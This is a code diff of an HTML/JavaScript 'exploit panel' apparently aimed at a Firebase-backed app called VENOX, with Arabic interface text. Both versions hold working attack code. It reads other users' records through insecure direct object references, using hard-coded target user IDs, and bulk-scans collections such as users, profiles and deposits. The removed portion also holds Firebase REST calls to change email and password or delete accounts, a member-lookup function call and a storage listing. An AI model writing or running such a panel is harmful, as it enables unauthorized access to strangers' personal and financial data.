@@ -3,12 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔥 VENOX - Full Exploit Panel</title>
+    <title>🔥 VENOX - استكشاف المستخدمين</title>
     
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
     
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, sans-serif; }
@@ -30,14 +29,12 @@
         .btn-primary:hover { background: #ea580c; transform: translateY(-2px); }
         .btn-success { background: #22c55e; color: #fff; }
         .btn-success:hover { background: #16a34a; transform: translateY(-2px); }
-        .btn-danger { background: #ef4444; color: #fff; }
-        .btn-danger:hover { background: #dc2626; transform: translateY(-2px); }
         .btn-secondary { background: rgba(255,255,255,0.08); color: #e2e8f0; }
         .btn-secondary:hover { background: rgba(255,255,255,0.15); transform: translateY(-2px); }
         .btn-info { background: rgba(59,130,246,0.2); color: #60a5fa; border: 1px solid rgba(59,130,246,0.3); }
         .btn-info:hover { background: rgba(59,130,246,0.3); transform: translateY(-2px); }
         
-        .result-box { background: rgba(0,0,0,0.3); padding: 12px; border-radius: 8px; font-family: monospace; font-size: 12px; color: #94a3b8; white-space: pre-wrap; word-break: break-all; max-height: 250px; overflow: auto; margin-top: 8px; }
+        .result-box { background: rgba(0,0,0,0.3); padding: 12px; border-radius: 8px; font-family: monospace; font-size: 12px; color: #94a3b8; white-space: pre-wrap; word-break: break-all; max-height: 300px; overflow: auto; margin-top: 8px; }
         .result-box.success { border: 1px solid rgba(34,197,94,0.3); color: #4ade80; }
         .result-box.error { border: 1px solid rgba(239,68,68,0.3); color: #f87171; }
         .result-box.warning { border: 1px solid rgba(249,115,22,0.3); color: #f97316; }
@@ -50,14 +47,14 @@
         .form-group input { width: 100%; padding: 8px 12px; border-radius: 6px; border: 1px solid rgba(255,255,255,0.08); background: rgba(255,255,255,0.04); color: #e2e8f0; font-size: 13px; outline: none; }
         .form-group input:focus { border-color: #f97316; }
         
+        .uid-display { background: rgba(249,115,22,0.1); padding: 6px 12px; border-radius: 6px; border: 1px solid rgba(249,115,22,0.2); color: #f97316; font-family: monospace; font-size: 12px; display: inline-block; margin-bottom: 6px; }
+        .token-display { background: rgba(0,0,0,0.4); padding: 6px 12px; border-radius: 6px; border: 1px solid rgba(59,130,246,0.2); color: #60a5fa; font-family: monospace; font-size: 11px; display: block; word-break: break-all; max-height: 60px; overflow: auto; margin-bottom: 6px; }
+        
         .toast { position: fixed; bottom: 24px; right: 24px; padding: 12px 20px; border-radius: 10px; color: #fff; font-size: 13px; z-index: 999; animation: slideUp 0.3s ease; max-width: 400px; }
         .toast-success { background: #22c55e; }
         .toast-error { background: #ef4444; }
         .toast-info { background: #3b82f6; }
         @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
-        
-        .uid-display { background: rgba(249,115,22,0.1); padding: 6px 12px; border-radius: 6px; border: 1px solid rgba(249,115,22,0.2); color: #f97316; font-family: monospace; font-size: 12px; display: inline-block; margin-bottom: 6px; }
-        .token-display { background: rgba(0,0,0,0.4); padding: 6px 12px; border-radius: 6px; border: 1px solid rgba(59,130,246,0.2); color: #60a5fa; font-family: monospace; font-size: 11px; display: block; word-break: break-all; max-height: 60px; overflow: auto; margin-bottom: 6px; }
     </style>
 </head>
 <body>
@@ -65,8 +62,8 @@
 <div class="container">
     <div class="header">
         <div>
-            <h1>🔥 VENOX · Full Exploit Panel</h1>
-            <div class="subtitle">جميع المحاولات (Firestore, Functions, REST, Storage, IDOR)</div>
+            <h1>🔥 VENOX · استكشاف المستخدمين</h1>
+            <div class="subtitle">محاولة قراءة بيانات المستخدمين الآخرين</div>
         </div>
         <span class="badge badge-connected" id="statusBadge">✅ جاهز</span>
     </div>
@@ -86,70 +83,48 @@
 
     <!-- ===== GRID ===== -->
     <div class="grid-2">
-        <!-- Firestore -->
+        <!-- UIDs -->
         <div class="card">
-            <h3>📄 Firestore</h3>
-            <div class="note">محاولة قراءة مجموعات مختلفة</div>
-            <button class="btn btn-info" onclick="fsRead('taskCompletions')">📋 taskCompletions</button>
-            <button class="btn btn-info" onclick="fsRead('users')">👤 users</button>
-            <button class="btn btn-info" onclick="fsRead('profiles')">👤 profiles</button>
-            <button class="btn btn-info" onclick="fsRead('deposits')">💰 deposits</button>
-            <button class="btn btn-info" onclick="fsRead('tasks')">📌 tasks</button>
-            <button class="btn btn-info" onclick="fsReadAll()">🔍 كل المجموعات</button>
-            <button class="btn btn-secondary" onclick="clearResult('fsResult')">🗑️ مسح</button>
-            <div id="fsResult" class="result-box">⏳ اضغط زر...</div>
-        </div>
-
-        <!-- IDOR -->
-        <div class="card">
-            <h3>🎯 IDOR - قراءة مستخدم</h3>
-            <div class="note">أدخل UID المستهدف</div>
-            <div style="display:flex;gap:6px;flex-wrap:wrap;">
-                <input type="text" id="targetUid" placeholder="UID" style="flex:2;padding:8px 12px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);border-radius:6px;color:#e2e8f0;min-width:150px;font-family:monospace;">
-                <button class="btn btn-info" onclick="idorRead()">👤 قراءة</button>
-            </div>
-            <div style="display:flex;gap:4px;flex-wrap:wrap;margin-top:6px;">
+            <h3>🆔 معرفات المستخدمين</h3>
+            <div class="note">من مجموعة taskCompletions</div>
+            <div style="display:flex;flex-wrap:wrap;gap:4px;margin-bottom:8px;">
                 <button class="btn btn-secondary" onclick="setUid('3NMRA9D5DEYPTOU')">3NMRA9...</button>
                 <button class="btn btn-secondary" onclick="setUid('4HNWIQMDKXTGYRO')">4HNWIQ...</button>
                 <button class="btn btn-secondary" onclick="setUid('560VHAUTASUFFAJ')">560VHA...</button>
+                <button class="btn btn-secondary" onclick="setUid('6CNWZD07IQQWMIO')">6CNWZD...</button>
                 <button class="btn btn-secondary" onclick="setUid('A2VUBNNHLFSXS9L')">A2VUBN...</button>
+                <button class="btn btn-secondary" onclick="setUid('B8HZGGZGCCFUGZP')">B8HZGG...</button>
+                <button class="btn btn-secondary" onclick="setUid('EEB31SYD25QFLFY')">EEB31S...</button>
+                <button class="btn btn-secondary" onclick="setUid('RZNCOWJNL9IDATJ')">RZNCOW...</button>
+                <button class="btn btn-secondary" onclick="setUid('ZQXWWJWUMTCEIFC')">ZQXWWJ...</button>
             </div>
-            <div id="idorResult" class="result-box">⏳ أدخل UID</div>
+            <div style="display:flex;gap:6px;flex-wrap:wrap;">
+                <input type="text" id="targetUid" placeholder="أدخل UID" style="flex:2;padding:8px 12px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);border-radius:6px;color:#e2e8f0;min-width:150px;font-family:monospace;">
+                <button class="btn btn-info" onclick="readUser()">👤 قراءة</button>
+                <button class="btn btn-secondary" onclick="clearResult('userResult')">🗑️ مسح</button>
+            </div>
+            <div id="userResult" class="result-box">⏳ أدخل UID واقرأ</div>
+        </div>
+
+        <!-- Bulk Scan -->
+        <div class="card">
+            <h3>🔍 فحص شامل</h3>
+            <div class="note">محاولة قراءة جميع المستخدمين</div>
+            <button class="btn btn-info" onclick="scanAllUsers()">👥 كل المستخدمين</button>
+            <button class="btn btn-info" onclick="scanTaskCompletions()">📋 كل المهام</button>
+            <button class="btn btn-secondary" onclick="clearResult('bulkResult')">🗑️ مسح</button>
+            <div id="bulkResult" class="result-box">⏳ اضغط زر...</div>
         </div>
     </div>
 
-    <div class="grid-2">
-        <!-- REST API -->
-        <div class="card">
-            <h3>🌐 REST API</h3>
-            <div class="note">استخدام Firebase Auth REST API</div>
-            <button class="btn btn-info" onclick="restLookup()">🔍 Lookup Account</button>
-            <button class="btn btn-info" onclick="restChangeEmail()">✉️ تغيير البريد</button>
-            <button class="btn btn-info" onclick="restChangePassword()">🔑 تغيير كلمة المرور</button>
-            <button class="btn btn-danger" onclick="restDeleteAccount()">🗑️ حذف الحساب</button>
-            <button class="btn btn-secondary" onclick="clearResult('restResult')">🗑️ مسح</button>
-            <div id="restResult" class="result-box">⏳ اضغط زر...</div>
-        </div>
-
-        <!-- Cloud Functions + Storage -->
-        <div class="card">
-            <h3>☁️ Functions & 📁 Storage</h3>
-            <button class="btn btn-info" onclick="callFunction()">☁️ LookupMember</button>
-            <button class="btn btn-info" onclick="scanStorage()">📁 فحص Storage</button>
-            <button class="btn btn-secondary" onclick="clearResult('funcResult')">🗑️ مسح</button>
-            <div id="funcResult" class="result-box">⏳ اضغط زر...</div>
-        </div>
-    </div>
-
-    <!-- ===== CREATE ACCOUNT ===== -->
+    <!-- ===== FIRESTORE ===== -->
     <div class="card">
-        <h3>🔐 إنشاء حساب جديد</h3>
-        <div style="display:flex;gap:8px;flex-wrap:wrap;">
-            <input type="email" id="signupEmail" placeholder="البريد" style="flex:1;padding:8px 12px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);border-radius:6px;color:#e2e8f0;min-width:150px;">
-            <input type="password" id="signupPassword" placeholder="كلمة المرور" style="flex:1;padding:8px 12px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);border-radius:6px;color:#e2e8f0;min-width:120px;" value="Test123!">
-            <button class="btn btn-success" onclick="createAccount()">🚀 إنشاء</button>
-        </div>
-        <div id="signupResult" class="result-box">⏳ انتظر...</div>
+        <h3>📄 Firestore - مجموعات مفتوحة</h3>
+        <button class="btn btn-info" onclick="fsRead('taskCompletions')">📋 taskCompletions</button>
+        <button class="btn btn-info" onclick="fsRead('tasks')">📌 tasks</button>
+        <button class="btn btn-info" onclick="fsReadAll()">🔍 كل المجموعات</button>
+        <button class="btn btn-secondary" onclick="clearResult('fsResult')">🗑️ مسح</button>
+        <div id="fsResult" class="result-box">⏳ اضغط زر...</div>
     </div>
 </div>
 
@@ -172,7 +147,6 @@ const FIREBASE_CONFIG = {
 firebase.initializeApp(FIREBASE_CONFIG);
 const auth = firebase.auth();
 const db = firebase.firestore();
-const storage = firebase.storage();
 
 let currentUid = '';
 let currentToken = '';
@@ -239,27 +213,100 @@ async function login() {
 }
 
 // ============================================================
-// 🔐 CREATE ACCOUNT
+// 👤 READ USER
 // ============================================================
-async function createAccount() {
-    const email = document.getElementById('signupEmail').value.trim();
-    const password = document.getElementById('signupPassword').value.trim();
-    const result = document.getElementById('signupResult');
+async function readUser() {
+    const targetUid = document.getElementById('targetUid').value.trim();
+    const result = document.getElementById('userResult');
     
-    if (!email || !password) {
-        setResult('signupResult', '❌ أدخل البريد وكلمة المرور', 'error');
+    if (!targetUid) {
+        setResult('userResult', '❌ أدخل UID', 'error');
+        return;
+    }
+    if (!currentUid) {
+        setResult('userResult', '❌ سجل دخول أولاً', 'error');
         return;
     }
     
-    setResult('signupResult', '⏳ جاري...', '');
+    setResult('userResult', `⏳ جاري قراءة ${targetUid}...`, '');
+    let output = `🎯 المستخدم: ${targetUid}\n${'='.repeat(40)}\n`;
     
+    // محاولة users
     try {
-        const userCred = await auth.createUserWithEmailAndPassword(email, password);
-        setResult('signupResult', `✅ تم إنشاء الحساب!\nUID: ${userCred.user.uid}\nالبريد: ${userCred.user.email}`, 'success');
-        showToast('✅ تم إنشاء الحساب', 'success');
-    } catch (error) {
-        setResult('signupResult', `❌ فشل: ${error.message}`, 'error');
-        showToast(`❌ ${error.message}`, 'error');
+        const doc = await db.collection('users').doc(targetUid).get();
+        if (doc.exists) {
+            output += `✅ users:\n${JSON.stringify(doc.data(), null, 2)}\n\n`;
+        } else {
+            output += `📭 users: لا توجد بيانات\n\n`;
+        }
+    } catch(e) {
+        output += `❌ users: ${e.message}\n\n`;
+    }
+    
+    // محاولة profiles
+    try {
+        const doc = await db.collection('profiles').doc(targetUid).get();
+        if (doc.exists) {
+            output += `✅ profiles:\n${JSON.stringify(doc.data(), null, 2)}\n\n`;
+        } else {
+            output += `📭 profiles: لا توجد بيانات\n\n`;
+        }
+    } catch(e) {
+        output += `❌ profiles: ${e.message}\n\n`;
+    }
+    
+    setResult('userResult', output, 'success');
+}
+
+function setUid(uid) {
+    document.getElementById('targetUid').value = uid;
+    readUser();
+}
+
+// ============================================================
+// 🔍 BULK SCAN
+// ============================================================
+async function scanAllUsers() {
+    const result = document.getElementById('bulkResult');
+    if (!currentUid) { setResult('bulkResult', '❌ سجل دخول أولاً', 'error'); return; }
+    setResult('bulkResult', '⏳ جاري فحص المستخدمين...', '');
+    
+    const uids = ['3NMRA9D5DEYPTOU', '4HNWIQMDKXTGYRO', '560VHAUTASUFFAJ', '6CNWZD07IQQWMIO', 'A2VUBNNHLFSXS9L', 'B8HZGGZGCCFUGZP', 'EEB31SYD25QFLFY', 'RZNCOWJNL9IDATJ', 'ZQXWWJWUMTCEIFC'];
+    let output = '👥 فحص المستخدمين:\n' + '='.repeat(40) + '\n';
+    let found = 0;
+    
+    for (const uid of uids) {
+        try {
+            const doc = await db.collection('users').doc(uid).get();
+            if (doc.exists) {
+                found++;
+                output += `✅ ${uid}:\n${JSON.stringify(doc.data(), null, 2)}\n\n`;
+            }
+        } catch(e) {
+            output += `❌ ${uid}: ${e.message}\n`;
+        }
+    }
+    
+    output += `\n📊 تم العثور على ${found} مستخدم`;
+    setResult('bulkResult', output, found > 0 ? 'success' : 'warning');
+}
+
+async function scanTaskCompletions() {
+    const result = document.getElementById('bulkResult');
+    setResult('bulkResult', '⏳ جاري قراءة المهام...', '');
+    try {
+        const snap = await db.collection('taskCompletions').get();
+        let output = `📋 المهام (${snap.size}):\n${'='.repeat(40)}\n`;
+        const users = new Set();
+        snap.forEach(doc => {
+            const data = doc.data();
+            users.add(data.userId);
+            output += `  ${JSON.stringify(data)}\n`;
+        });
+        output += `\n👥 عدد المستخدمين: ${users.size}`;
+        setResult('bulkResult', output, 'success');
+    } catch(e) {
+        setResult('bulkResult', `❌ ${e.message}`, 'error');
     }
 }
 
@@ -271,7 +318,7 @@ async function fsRead(collection) {
     if (!currentUid) { setResult('fsResult', '❌ سجل دخول أولاً', 'error'); return; }
     setResult('fsResult', `⏳ جاري قراءة ${collection}...`, '');
     try {
-        const snap = await db.collection(collection).limit(5).get();
+        const snap = await db.collection(collection).limit(10).get();
         if (snap.empty) {
             setResult('fsResult', `📭 ${collection}: فارغ`, 'warning');
         } else {
@@ -290,7 +337,7 @@ async function fsReadAll() {
     const result = document.getElementById('fsResult');
     if (!currentUid) { setResult('fsResult', '❌ سجل دخول أولاً', 'error'); return; }
     setResult('fsResult', '⏳ جاري فحص الكل...', '');
-    const collections = ['users', 'profiles', 'deposits', 'tasks', 'taskCompletions', 'referrals', 'adminEvents', 'notifications'];
+    const collections = ['users', 'profiles', 'deposits', 'tasks', 'taskCompletions', 'referrals', 'notifications'];
     let output = '';
     for (const col of collections) {
         try {
@@ -305,179 +352,6 @@ async function fsReadAll() {
         }
     }
     setResult('fsResult', output || '📭 لا توجد نتائج', 'success');
-}
-
-// ============================================================
-// 🎯 IDOR
-// ============================================================
-async function idorRead() {
-    const targetUid = document.getElementById('targetUid').value.trim();
-    const result = document.getElementById('idorResult');
-    
-    if (!targetUid) { setResult('idorResult', '❌ أدخل UID', 'error'); return; }
-    if (!currentUid) { setResult('idorResult', '❌ سجل دخول أولاً', 'error'); return; }
-    
-    setResult('idorResult', `⏳ جاري قراءة ${targetUid}...`, '');
-    let output = `🎯 المستخدم: ${targetUid}\n${'='.repeat(40)}\n`;
-    
-    try {
-        const doc = await db.collection('users').doc(targetUid).get();
-        if (doc.exists) {
-            output += `✅ users:\n${JSON.stringify(doc.data(), null, 2)}\n\n`;
-        } else {
-            output += `📭 users: لا توجد بيانات\n\n`;
-        }
-    } catch(e) {
-        output += `❌ users: ${e.message}\n\n`;
-    }
-    
-    try {
-        const doc = await db.collection('profiles').doc(targetUid).get();
-        if (doc.exists) {
-            output += `✅ profiles:\n${JSON.stringify(doc.data(), null, 2)}\n\n`;
-        } else {
-            output += `📭 profiles: لا توجد بيانات\n\n`;
-        }
-    } catch(e) {
-        output += `❌ profiles: ${e.message}\n\n`;
-    }
-    
-    setResult('idorResult', output, 'success');
-}
-
-function setUid(uid) {
-    document.getElementById('targetUid').value = uid;
-    idorRead();
-}
-
-// ============================================================
-// 🌐 REST API
-// ============================================================
-async function restLookup() {
-    const result = document.getElementById('restResult');
-    if (!currentToken) { setResult('restResult', '❌ سجل دخول أولاً', 'error'); return; }
-    setResult('restResult', '⏳ جاري...', '');
-    try {
-        const res = await fetch(`https://identitytoolkit.googleapis.com/v1/accounts:lookup?key=${API_KEY}`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ idToken: currentToken })
-        });
-        const data = await res.json();
-        setResult('restResult', `✅ Lookup:\n${JSON.stringify(data, null, 2)}`, data.error ? 'error' : 'success');
-    } catch(e) {
-        setResult('restResult', `❌ ${e.message}`, 'error');
-    }
-}
-
-async function restChangeEmail() {
-    const result = document.getElementById('restResult');
-    if (!currentToken) { setResult('restResult', '❌ سجل دخول أولاً', 'error'); return; }
-    const newEmail = prompt('أدخل البريد الجديد:');
-    if (!newEmail) return;
-    setResult('restResult', '⏳ جاري تغيير البريد...', '');
-    try {
-        const res = await fetch(`https://identitytoolkit.googleapis.com/v1/accounts:update?key=${API_KEY}`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                idToken: currentToken,
-                email: newEmail,
-                returnSecureToken: true
-            })
-        });
-        const data = await res.json();
-        setResult('restResult', `✅ تغيير البريد:\n${JSON.stringify(data, null, 2)}`, data.error ? 'error' : 'success');
-    } catch(e) {
-        setResult('restResult', `❌ ${e.message}`, 'error');
-    }
-}
-
-async function restChangePassword() {
-    const result = document.getElementById('restResult');
-    if (!currentToken) { setResult('restResult', '❌ سجل دخول أولاً', 'error'); return; }
-    const newPass = prompt('أدخل كلمة المرور الجديدة:');
-    if (!newPass) return;
-    setResult('restResult', '⏳ جاري تغيير كلمة المرور...', '');
-    try {
-        const res = await fetch(`https://identitytoolkit.googleapis.com/v1/accounts:update?key=${API_KEY}`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                idToken: currentToken,
-                password: newPass,
-                returnSecureToken: true
-            })
-        });
-        const data = await res.json();
-        setResult('restResult', `✅ تغيير كلمة المرور:\n${JSON.stringify(data, null, 2)}`, data.error ? 'error' : 'success');
-    } catch(e) {
-        setResult('restResult', `❌ ${e.message}`, 'error');
-    }
-}
-
-async function restDeleteAccount() {
-    const result = document.getElementById('restResult');
-    if (!currentToken) { setResult('restResult', '❌ سجل دخول أولاً', 'error'); return; }
-    if (!confirm('⚠️ هل أنت متأكد من حذف الحساب؟')) return;
-    setResult('restResult', '⏳ جاري حذف الحساب...', '');
-    try {
-        const res = await fetch(`https://identitytoolkit.googleapis.com/v1/accounts:delete?key=${API_KEY}`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ idToken: currentToken })
-        });
-        const data = await res.json();
-        setResult('restResult', `🗑️ حذف الحساب:\n${JSON.stringify(data, null, 2)}`, data.error ? 'error' : 'success');
-    } catch(e) {
-        setResult('restResult', `❌ ${e.message}`, 'error');
-    }
-}
-
-// ============================================================
-// ☁️ CLOUD FUNCTIONS
-// ============================================================
-async function callFunction() {
-    const result = document.getElementById('funcResult');
-    if (!currentToken) { setResult('funcResult', '❌ سجل دخول أولاً', 'error'); return; }
-    setResult('funcResult', '⏳ جاري استدعاء...', '');
-    try {
-        const res = await fetch('https://us-central1-venox-ffe5c.cloudfunctions.net/venoxLookupMemberByEmail', {
-            method: 'POST',
-            headers: {
-                'Authorization': 'Bearer ' + currentToken,
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({ email: document.getElementById('loginEmail').value.trim() || 'test@example.com' })
-        });
-        const data = await res.json();
-        setResult('funcResult', `☁️ Function:\n${JSON.stringify(data, null, 2)}`, data.error ? 'error' : 'success');
-    } catch(e) {
-        setResult('funcResult', `❌ ${e.message}`, 'error');
-    }
-}
-
-// ============================================================
-// 📁 STORAGE
-// ============================================================
-async function scanStorage() {
-    const result = document.getElementById('funcResult');
-    if (!currentUid) { setResult('funcResult', '❌ سجل دخول أولاً', 'error'); return; }
-    setResult('funcResult', '⏳ جاري فحص Storage...', '');
-    try {
-        const listRef = storage.ref('/');
-        const res = await listRef.listAll();
-        if (res.items.length === 0 && res.prefixes.length === 0) {
-            setResult('funcResult', '📭 Storage فارغ أو ممنوع', 'warning');
-        } else {
-            let output = '📁 Storage:\n';
-            res.items.forEach(item => output += `  📄 ${item.name}\n`);
-            res.prefixes.forEach(prefix => output += `  📁 ${prefix.name}/\n`);
-            setResult('funcResult', output, 'success');
-        }
-    } catch(e) {
-        setResult('funcResult', `❌ ${e.message}`, 'error');
-    }
 }
 </script>
 
